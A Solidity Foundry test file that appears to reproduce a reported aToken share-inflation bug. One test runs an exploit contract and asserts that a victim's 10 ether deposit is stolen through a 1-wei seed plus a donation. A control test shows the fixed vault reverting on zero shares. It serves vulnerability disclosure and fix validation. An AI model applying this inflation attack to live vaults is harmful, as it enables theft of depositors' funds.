// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, ERC20Mini, ATokenFixed, Depositor} from "./51950-price-inflation-in-atoken-halborn-bonzo-finance-contracts-ma.sol";

contract ATokenInflationTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_donationRoundsVictimSharesToZero() public {
        Exploit exp = new Exploit();
        exp.run();

        assertEq(exp.victimShares(), 0, "victim minted 0 shares");
        assertEq(exp.profit(), 10 ether, "stolen amount is the victim deposit");
        assertEq(exp.token().balanceOf(SINK), 10 ether, "10 ether moved to the sink");
        assertEq(exp.token().balanceOf(address(exp.victim())), 0, "victim was emptied");
        assertEq(exp.vault().balanceOf(address(exp)), 0, "attacker burned the 1 wei share");
    }

    function test_control_zeroSharesRevertKeepsVictimDeposit() public {
        ERC20Mini token = new ERC20Mini("UNDERLYING");
        ATokenFixed vault = new ATokenFixed(token);
        Depositor victim = new Depositor();

        token.mint(address(this), 1 + 10 ether);
        token.approve(address(vault), 1);
        vault.deposit(1);
        token.transfer(address(vault), 10 ether);

        token.mint(address(victim), 10 ether);
        vm.expectRevert(bytes("zero shares minted"));
        victim.depositFixed(vault, token, 10 ether);

        assertEq(token.balanceOf(address(victim)), 10 ether, "victim keeps 10 ether");
        assertEq(vault.balanceOf(address(victim)), 0, "victim has no shares");
        assertEq(token.balanceOf(SINK), 0, "control does not produce the 10 ether profit");

        uint256 got = vault.withdraw(1);
        assertEq(got, 1 + 10 ether, "attacker recovers only seed plus donation");
    }
}
